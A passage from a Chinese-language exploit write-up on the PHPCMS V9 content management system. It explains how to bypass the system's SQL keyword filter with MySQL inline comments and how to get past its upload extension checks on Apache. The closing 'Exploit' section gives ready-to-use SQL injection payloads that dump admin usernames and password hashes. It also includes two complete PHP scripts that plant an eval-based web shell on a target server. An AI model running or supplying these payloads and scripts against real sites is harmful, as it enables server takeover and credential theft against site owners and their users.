+ if(’&amp;#42’ == $value || false !== strpos($value, ’(’) || false !== strpos($value, ’.’) || false !== strpos ( $value, ’</code>’)) {<br> //不处理包含&amp;#42 或者 使用了sql方法。<br> } else {<br>     $value = ’<code>’.trim($value).’</code>’;<br> }<br> if (preg_match(“/(select|insert|update|delete)/i”, $value)) {<br>     $value = preg_replace(“/(select|insert|update|delete)/i”, ’’, $value);<br> }<br> return $value;<br> }</pre><br><br><span style="font-size:10.5pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">很明显厂商直接做了过滤：</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:’Times New Roman’;">$value&nbsp;=&nbsp;preg_replace(“/(select|insert|update|delete)/i”,&nbsp;’’,&nbsp;$value);</span><span style="font-size:10.5pt;font-family:’Times New Roman’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">看着这个可能有人会猜测</span><span style="font-size:10.5pt;font-family:宋体;">selselectect<span style="font-family:宋体;">是不是可以绕过呢，答案是否的。大家可以看到有个</span><span style="font-family:’Times New Roman’;"></span><span style="font-family:宋体;">，这个为整词匹配，也就是说如果你是</span><span style="font-family:’Times New Roman’;">selselectect</span><span style="font-family:宋体;">，这个为一个完整的词，用这个完整的词去匹配，不会单独拿这个词的一部分去匹配，因此经过匹配仍然是</span><span style="font-family:’Times New Roman’;">selselecctect</span><span style="font-family:宋体;">。</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">那我们怎么绕过呢？</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">/&amp;#42!50000select&amp;#42/<span style="font-family:宋体;">这个就是答案了，首先作为一个整词</span><span style="font-family:’Times New Roman’;">50000select</span><span style="font-family:宋体;">是不会被正则掉的，其次使用</span><span style="font-family:’Times New Roman’;">/&amp;#42!&amp;#42/</span><span style="font-family:宋体;">这个特殊的</span><span style="font-family:’Times New Roman’;">mysql</span><span style="font-family:宋体;">的特性使得</span><span style="font-family:’Times New Roman’;">select</span><span style="font-family:宋体;">的作用不变，完整的绕过了补丁。</span></span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">从上文提到的两个注入可以看出这个过滤函数是非常重要的，如果这个过滤函数被绕过了，注入漏洞也许不止上文中的两个吧！</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x03&nbsp;<span style="font-family:宋体;">破不开的密码</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">上文提到了注入，我们也只是得到了当前的数据库操作权限（数据库权限大，可以跨库之类的就另当别论了）。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">当然我们有了注入读取管理员进入后台，然后后台<span style="font-family:’Times New Roman’;">getwebshell</span><span style="font-family:宋体;">这个是一般思路，但是</span><span style="font-family:’Times New Roman’;">phpcms&nbsp;v9</span><span style="font-family:宋体;">的加密是加有</span><span style="font-family:’Times New Roman’;">salt</span><span style="font-family:宋体;">的和</span><span style="font-family:’Times New Roman’;">dz</span><span style="font-family:宋体;">加密一样，使之破解难度非常大。以前写过一个</span><span style="font-family:’Times New Roman’;">php</span><span style="font-family:宋体;">破解脚本，单线程效率灰常低，有兴趣了可以看下。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">    </span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;color:#ff0000;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;"><a href="http://lanu.sinaapp.com/PHP_study/89.html" target="_blank" rel="noopener">http://lanu.sinaapp.com/PHP_study/89.html</a></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">密码破不开只能看看有没有什么前台</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">getwebshell<span style="font-family:宋体;">之类的了。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x04&nbsp;<span style="font-family:宋体;">曾经的</span><span style="font-family:’Times New Roman’;">getwebshell</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">漏洞文件：<span style="font-family:’Times New Roman’;">phpcmsmodulesattachmentattachments.php</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">漏洞函数：<span style="font-family:’Times New Roman’;">crop_upload</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">if (isset($GLOBALS[“HTTP_RAW_POST_DATA”])) {<br>$pic = $GLOBALS[“HTTP_RAW_POST_DATA”];//这里可以得知，图片内容由POST控制<br>//中间省略十万行<br>if (strpos($_GET[’file’], pc_base::load_config(’system’, ’upload_url’))!==false) {<br>$file = $<em>GET[’file’];<br>$basename = basename($file);<br>if (strpos($basename, ’thumb</em>’)!==false) {<br>$file_arr = explode(’_’, $basename);<br>$basename = array_pop($file_arr);<br>}<br>$new_file = ’thumb_’.$width.’<em>’.$height.’</em>’.$basename;<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">//<span style="font-family:宋体;">中间省略十万行</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">file_put_contents($this-&gt;upload_path.$filepath.$new_file,&nbsp;$pic);</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">//<span style="font-family:宋体;">上面可见，文件名</span><span style="font-family:’Times New Roman’;">$basename</span><span style="font-family:宋体;">可控，图片内容可控，还有什么不能做？？</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">}</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">上面这段代码是截取</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">wooyun<span style="font-family:宋体;">上的，时间太久了没有找到当时漏洞版本的程序。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">网上也有相应的<span style="font-family:’Times New Roman’;">exp</span><span style="font-family:宋体;">：</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php<br>error_reporting(E_ERROR);<br>set_time_limit(0);<br>$pass=”wooyun.in”;<br>print_r(’<br>+—————————————————————————+<br>PHPCms V9 GETSHELL 0DAY<br>c0de by testr00ttest<br>针对iis6.0的漏洞 有点鸡肋 但是也可以用<br>apache 是老版本可能会产生问题<br>+—————————————————————————+<br>’);<br>echo ’密码为’.$pass;<br>if ($argc &lt; 2) {<br>print_r(’<br>+—————————————————————————+<br>Usage: php ’.$argv[0].’ url [js]<br>js 类型配置  1为asp 2为php  3为apache 的版本<br>Example:<br>php ’.$argv[0].’ <a href="http://www.wooyun.in" target="_blank" rel="noopener">www.wooyun.in</a> 1<br>+—————————————————————————+<br>’);<br>exit;<br>}<br>$url=$argv[1];<br>$js=$argv[2];//写入脚本类型 wooyun.in<br>$phpshell=’&lt;?php @eval($_POST[’’.$pass.’’]);?&gt;’;<br>$aspshell=’&lt;%eval request(“’.$pass.’”)%&gt;’;<br>if($js==1){<br>        $file=”1.asp;1.jpg”;<br>         $ret=GetShell($url,$aspshell,$file);<br>}else if($js==2){<br>        $file=”1.php;1.jpg”;<br>        $ret=GetShell($url,$phpshell,$file);<br>}else if($js==3){<br>        $file=”1.php.jpg”;<br>        $ret=GetShell($url,$phpshell,$file);<br>}else{<br>        print_r(’没有选择脚本类型’);<br>}<br>$pattern = “|http://[^,]+?.jpg,?|U”;<br>preg_match_all($pattern, $ret, $matches);<br>if($matches[0][0]){<br>        echo “<br>url地址:”.$matches[0][0];<br>}else{<br>        echo “<br>没得到！”;<br>}<br>function GetShell($url,$shell,$js){<br>        $content =$shell;<br>        $data = “POST /index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=1&amp;height=1&amp;file=http://“.$url.”/uploadfile/“.$js.” HTTP/1.1<br>“;<br>        $data .= “Host: “.$url.”<br>“;<br>        $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1<br>“;<br>        $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8<br>“;<br>        $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br>“;<br>        $data .= “Connection: close<br>“;<br>        $data .= “Content-Length: “.strlen($content).”<br><br>“;<br>        $data .= $content.”<br>“;<br>        //echo $data;<br>        $ock=fsockopen($url,80);<br>        if (!$ock) {<br>        echo “  No response from “.$url.”<br>“;<br>        }<br>        fwrite($ock,$data);<br>        $resp = ’’;<br>        while (!feof($ock)) {<br>               $resp.=fread($ock, 1024);<br>       }<br>       return $resp;<br>}<br>?&gt;</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">可以看出基本都是利用的</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">web<span style="font-family:宋体;">容器的解析漏洞，时间过了这么久了，厂商补丁应该是打上了。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">我在最新的<span style="font-family:’Times New Roman’;">phpcms</span><span style="font-family:宋体;">中使用这个</span><span style="font-family:’Times New Roman’;">exp</span><span style="font-family:宋体;">，没有成功。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x05&nbsp;<span style="font-family:宋体;">补漏了</span><span style="font-family:’Times New Roman’;">apache</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">补丁已打，但却依然不是那么完善。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">最新程序：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">    </span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">public function crop_upload() {<br>if (isset($GLOBALS[“HTTP_RAW_POST_DATA”])) {<br>$pic = $GLOBALS[“HTTP_RAW_POST_DATA”];<br>if (isset($_GET[’width’]) &amp;&amp; !empty($_GET[’width’])) {<br>$width = intval($_GET[’width’]);<br>}<br>if (isset($_GET[’height’]) &amp;&amp; !empty($_GET[’height’])) {<br>$height = intval($_GET[’height’]);<br>}<br>if (isset($_GET[’file’]) &amp;&amp; !empty($_GET[’file’])) {<br>$_GET[’file’] = str_replace(’;’,’’,$_GET[’file’]);//过滤了fen号<br>if(is_image($_GET[’file’])== false || strpos($_GET[’file’],’.php’)!==false) exit();//is_image()检测是个关键<br>if (strpos($_GET[’file’], pc_base::load_config(’system’, ’upload_url’))!==false) {<br>$file = $<em>GET[’file’];<br>$basename = basename($file);//获取带有后缀的文件名<br>if (strpos($basename, ’thumb</em>’)!==false) {<br>$file_arr = explode(’_’, $basename);<br>$basename = array_pop($file_arr);<br>}<br>$new_file = ’thumb_’.$width.’<em>’.$height.’</em>’.$basename;<br>} else {<br>pc_base::load_sys_class(’attachment’,’’,0);<br>$module = trim($_GET[’module’]);<br>$catid = intval($_GET[’catid’]);<br>$siteid = $this-&gt;get_siteid();<br>$attachment = new attachment($module, $catid, $siteid);<br>$uploadedfile[’filename’] = basename($_GET[’file’]);<br>$uploadedfile[’fileext’] = fileext($_GET[’file’]);<br>if (in_array($uploadedfile[’fileext’], array(’jpg’, ’gif’, ’jpeg’, ’png’, ’bmp’))) {<br>$uploadedfile[’isimage’] = 1;<br>}<br>$file_path = $this-&gt;upload_path.date(’Y/md/’);<br>pc_base::load_sys_func(’dir’);<br>dir_create($file_path);<br>$new_file = date(’Ymdhis’).rand(100, 999).’.’.$uploadedfile[’fileext’];<br>$uploadedfile[’filepath’] = date(’Y/md/’).$new_file;<br>$aid = $attachment-&gt;add($uploadedfile);<br>}<br>$filepath = date(’Y/md/’);<br>file_put_contents($this-&gt;upload_path.$filepath.$new_file, $pic);<br>} else {<br>return false;<br>}<br>echo pc_base::load_config(’system’, ’upload_url’).$filepath.$new_file;<br>exit;<br>}<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">后缀检测：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">phpcmsmodulesattachmentfunctionsglobal.func.php<br>function is_image($file) {<br>$ext_arr = array(’jpg’,’gif’,’png’,’bmp’,’jpeg’,’tiff’);<br>$ext = fileext($file);关键地方<br>return in_array($ext,$ext_arr) ? $ext_arr :false;<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">关键函数</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">:</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">function fileext($filename) {<br>return strtolower(trim(substr(strrchr($filename, ’.’), 1, 10)));<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">Fileext<span style="font-family:宋体;">函数是对文件后缀名的提取。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">根据此函数我们如果上传文件名为</span><span style="mso-spacerun:’yes’;color:#ff0000;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">ddd.Php.jpg%20%20%20%20%20%20%20Php</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">经过此函数提取到的后缀还是<span style="font-family:’Times New Roman’;">jpg</span><span style="font-family:宋体;">，因此正在</span><span style="font-family:’Times New Roman’;">is_image()</span><span style="font-family:宋体;">函数中后缀检测被绕过了。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">我们回到</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">public&nbsp;function&nbsp;crop_upload()&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">函数中</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">if(is_image($_GET[’file’])== false || strpos($_GET[’file’],’.php’)!==false) exit();</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">在经过了</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">is_image<span style="font-family:宋体;">的判断之后又来了个</span><span style="font-family:’Times New Roman’;">.php</span><span style="font-family:宋体;">的判断，在此程序员使用的是</span><span style="font-family:’Times New Roman’;">strpos</span><span style="font-family:宋体;">函数</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">这个函数是对大小写敏感的函数我们使用<span style="font-family:’Times New Roman’;">.Php</span><span style="font-family:宋体;">就可以直接绕过了。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">经过上边的两层的过滤我们的<span style="font-family:’Times New Roman’;">ddd.Php.jpg%20%20%20%20%20%20%20Php</span><span style="font-family:宋体;">后缀依然有效。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">最后<span style="font-family:’Times New Roman’;">$basename</span><span style="font-family:宋体;">变量的值就为</span><span style="font-family:’Times New Roman’;">ddd.Php.jpg%20%20%20%20%20%20%20Php&nbsp;</span><span style="font-family:宋体;">然后使用</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">file_put_contents</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">函数写入到了指定目录。</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">看见</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">ddd.Php.jpg%20%20%20%20%20%20%20Php<span style="font-family:宋体;">这个后缀，大家应该明白了，它用在</span><span style="font-family:’Times New Roman’;">apache</span><span style="font-family:宋体;">搭建的服务器上可以被解析。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x06&nbsp;Exp</span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">l</span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">oit<span style="font-family:宋体;">编写</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">1.</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">注入：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">短消息回复注入：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:sql; toolbar: true; auto-links: true;">%60userid%60%29+values%28%28/&amp;#42!50000SeLECT&amp;#42/+1+FROM+%28/&amp;#42!50000SeLECT&amp;#42/+count%28%2a%29%2Cconcat%28floor%28rand%280%29%2a2%29%2C%28substring%28%28/&amp;#42!50000SeLECT&amp;#42/+%28/&amp;#42!50000SeLECT&amp;#42/+concat%280x23%2Ccast%28concat%28username%2C0x3a%2Cpassword%2C0x3a%2Cencrypt%29+as+char%29%2C0x23%29+from+v9_admin+LIMIT++0%2C1%29%29%2C1%2C62%29%29%29a+from+information_schema%2Etables+group+by+a%29b%29%29+%2D%2D+</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">生日修改注入：</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:sql; toolbar: true; auto-links: true;">%60userid%60%3D%28/&amp;#42!50000SeLECT&amp;#42/+1+FROM+%28/&amp;#42!50000SeLECT&amp;#42/+count%28%2a%29%2Cconcat%28floor%28rand%280%29%2a2%29%2C%28substring%28%28/&amp;#42!50000SeLECT&amp;#42/+%28/&amp;#42!50000SeLECT&amp;#42/+concat%280x23%2Ccast%28concat%28username%2C0x3a%2Cpassword%2C0x3a%2Cencrypt%29+as+char%29%2C0x23%29+from+v9_admin+LIMIT++0%2C1%29%29%2C1%2C62%29%29%29a+from+information_schema%2Etables+group+by+a%29b%29+%2D%2D+</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">2.</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">getshell(apache)&nbsp;</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php<br>error_reporting(E_ERROR);<br>set_time_limit(0);<br>$pass=”ln”;<br>print_r(’<br>+—————————————————————————+<br>PHPCms V9 GETSHELL 0DAY<br>code by L.N.<br>apache 适用(利用的apache的解析漏洞)<br>+—————————————————————————+<br>’);<br>if ($argc &lt; 2) {<br>print_r(’<br>+—————————————————————————+<br>Usage: php ’.$argv[0].’ url path<br>Example:<br>1.php ’.$argv[0].’ lanu.sinaapp.com<br>2.php ’.$argv[0].’ lanu.sinaapp.com /phpcms<br>+—————————————————————————+<br>’);<br>exit;<br>}<br>$url = $argv[1];<br>$path = $argv[2];<br>$phpshell = ’&lt;?php @eval($<em>POST[’’.$pass.’’]);?&gt;’;<br>$file = ’1.thumb</em>.Php.JPG%20%20%20%20%20%20%20Php’;<br>if($ret=Create_dir($url,$path))<br>{<br>//echo $ret;<br>$pattern = “|Server:[^,]+?|U”;<br>preg_match_all($pattern, $ret, $matches);<br>if($matches[0][0])<br>{<br>if(strpos($matches[0][0],’Apache’) == false)<br>{<br>echo “<br>亲！此网站不是apache的网站。<br>“;exit;<br>}<br>}<br>$ret = GetShell($url,$phpshell,$path,$file);<br>$pattern = “|http://[^,]+?.,?|U”;<br>preg_match_all($pattern, $ret, $matches);<br>if($matches[0][0])<br>{<br>echo “<br>“.’密码为: ’.$pass.”<br>“;<br>echo “<br>url地址: “.$matches[0][0].’JPG%20%20%20%20%20%20%20Php’.”<br>“;exit;<br>}<br>else<br>{<br>$pattern = “|/uploadfile/[^,]+?.,?|U”;<br>preg_match_all($pattern, $ret, $matches);<br>if($matches[0][0])<br>{<br>echo “<br>“.’密码为: ’.$pass.”<br>“;<br>echo “<br>url地址:”.’http://’.$url.$path.$matches[0][0].’JPG%20%20%20%20%20%20%20Php’.”<br>“;exit;<br>}<br>else<br>{<br>echo “<br>没得到！<br>“;exit;<br>}<br>}<br>}<br>function GetShell($url,$shell,$path,$js)<br>{<br>    $content =$shell;<br>    $data = “POST “.$path.”/index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=6&amp;height=6&amp;file=http://“.$url.$path.”/uploadfile/“.$js.” HTTP/1.1<br>“;<br>    $data .= “Host: “.$url.”<br>“;<br>    $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1<br>“;<br>    $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8<br>“;<br>    $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br>“;<br>    $data .= “Connection: close<br>“;<br>    $data .= “Content-Length: “.strlen($content).”<br><br>“;<br>    $data .= $content.”<br>“;<br>    $ock=fsockopen($url,80);<br>    if (!$ock)<br>{<br>        echo “<br>“.”此网站没有回应,检测url是否输入正确”.”<br>“;exit;<br>    }<br>else<br>{<br>fwrite($ock,$data);<br>$resp = ’’;<br>while (!feof($ock))<br>{<br>$resp.=fread($ock, 1024);<br>}<br>return $resp;<br>}<br>}<br>function Create_dir($url,$path=’’)<br>{<br>    $content =’I love you’;<br>    $data = “POST “.$path.”/index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=6&amp;height=6&amp;file=<a href="http://lanu.sinaapp.com/1.jpg" target="_blank" rel="noopener">http://lanu.sinaapp.com/1.jpg</a> HTTP/1.1<br>“;<br>    $data .= “Host: “.$url.”<br>“;<br>    $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1<br>“;<br>    $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8<br>“;<br>    $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br>“;<br>    $data .= “Connection: close<br>“;<br>    $data .= “Content-Length: “.strlen($content).”<br><br>“;<br>    $data .= $content.”<br>“;<br>    $ock=fsockopen($url,80);<br>    if (!$ock)<br>{<br>        echo “<br>“.”此网站没有回应,检测url是否输入正确”.”<br>“;exit;<br>    }<br>fwrite($ock,$data);<br>    $resp = ’’;<br>    while (!feof($ock))<br>{<br>        $resp.=fread($ock, 1024);<br>    }<br>return $resp;<br>}<br>?&gt;</pre><br><br><span 